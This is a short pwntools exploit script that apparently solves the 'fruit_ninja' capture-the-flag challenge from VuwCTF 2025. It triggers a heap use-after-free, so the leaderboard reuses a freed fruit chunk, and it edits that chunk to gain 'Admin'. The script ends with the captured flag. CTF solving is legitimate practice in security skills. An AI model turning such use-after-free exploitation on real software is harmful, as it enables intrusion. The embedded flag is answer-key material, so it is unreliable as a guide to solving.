import argparse
import sys, os
sys.path.append(os.environ.get('PWNFAST_PATH'))
from pwn import *
from pwnfast import *

_p = argparse.ArgumentParser()
_p.add_argument('-d', action="store_true")
_p.add_argument('-r', action="store_true")
_p.add_argument('-s', action="store_true")
args = _p.parse_args()

context.terminal = ['tmux', 'new-window']

PROG = './fruit_ninja'
host, port = 'fruit-ninja.challenges.2025.vuwctf.com', 9978

def start():
    if args.r:
        return PwnRemote(PROG, host, port)
    elif args.s:
        return PwnSsh(PROG, '', host, port, 'guest')
    else:
        return PwnLocal(PROG, args.d)


### ------------------ EXPLOIT ------------------ ###

r = start()

def slice(name):
    r.sla(b'Choice: ', b'1')
    r.sla(b'chars): ', name)
    r.sla(b'fruit: ', b'1')

slice(b'AAAA')
slice(b'BBBB')

# Free first fruit
r.sla(b'Choice: ', b'2')
r.sla(b'): ', b'0')

# Reset leaderboard (free + malloc same size chunk)
# leaderboard will take the recently freed chunk
r.sla(b'Choice: ', b'6')

# Use after free, edit first fruit which is now leaderboard
r.sla(b'Choice: ', b'4')
r.sla(b'): ', b'0')
r.sla(b'chars): ', b'Admin')

r.sla(b'Choice: ', b'5')

r.interactive()
# VuwCTF{fr33_th3_h34p_sl1c3_th3_fr00t}
